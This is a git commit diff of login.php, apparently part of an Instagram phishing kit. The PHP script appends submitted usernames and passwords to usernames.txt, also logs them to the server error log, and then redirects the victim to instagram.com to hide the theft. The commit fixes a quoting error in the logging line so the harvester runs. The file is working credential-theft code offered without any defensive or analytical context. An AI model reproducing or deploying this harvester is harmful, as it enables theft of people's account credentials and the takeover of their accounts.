ee73a4c311c021c81ed13573ab1f48fa6a0e516e
rekcahkumar <48340011+rekcahkumar@users.noreply.github.com>
2021-04-14 15:41:58 +0530

    Add files via upload

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-error_log(""Account: " . $_POST['username'] . " Pass: " . $_POST['password'] );
+error_log("Account: " . $_POST['username'] . " Pass: " . $_POST['password'] );
 header('Location: https://instagram.com');
 exit();
